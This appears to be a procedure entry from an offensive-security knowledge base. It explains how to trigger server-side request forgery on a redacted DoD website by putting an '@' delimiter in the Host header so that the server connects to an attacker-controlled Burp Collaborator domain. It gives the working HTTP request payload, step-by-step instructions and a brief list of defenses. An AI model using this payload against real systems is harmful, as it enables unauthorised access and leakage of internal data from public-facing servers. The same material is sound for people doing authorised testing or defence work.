---
tags:
  - ssrf
  - host-header
  - exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/ssrf-host-header-get]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:53:38.030Z'
sub_techniques: []
id: 091f557d-fe51-4dc2-9b36-8dac552cb490
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-Host-Header-to-Trigger-SSRF

## Summary

This procedure exploits an SSRF vulnerability by modifying the Host header in HTTP requests to include an '@' symbol, causing the server to interpret it as a username delimiter and connect to an attacker-controlled host.

## Description

The DoD website's server-side Host header parsing follows RFC standards for URL authentication (username@host), allowing attackers to redirect backend connections. Using Burp Suite, the request is intercepted and altered, triggering out-of-band interactions. This leads to immediate leakage of internal details upon successful redirection.

## Requirements

1. Burp Suite for request interception and modification
2. Control over a collaborator domain (e.g., Burp Collaborator)
3. Access to the target endpoint on port 80

## Defense

Defensive measures and detection strategies:

- Validate and whitelist Host headers against expected domains
- Disable URL parsing features that allow '@' delimiters in backend connections
- Monitor for unexpected outbound connections to external domains

## Objectives

1. Redirect server connection to attacker-controlled host
2. Trigger SSRF payload execution
3. Observe initial leakage of request headers

## Instructions

### Step 1: Intercept and Modify Request

**Context**: Use Burp Suite to capture a standard request and alter the Host header to exploit the delimiter.

**Command** ([[commands/ssrf-host-header-get]]):
```http
GET / HTTP/1.1
Host: www.█████████:80@██████████.burpcollaborator.net
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close
```

> Forward the modified request; the server will connect to burpcollaborator.net, leaking the original request context.

### Step 2: Verify Redirection

**Context**: Confirm the SSRF by checking for backend connection attempts.

> No additional command; monitor Burp Collaborator for incoming traffic.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/ssrf-host-header-get]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- ssrf
- host-header
- exploitation
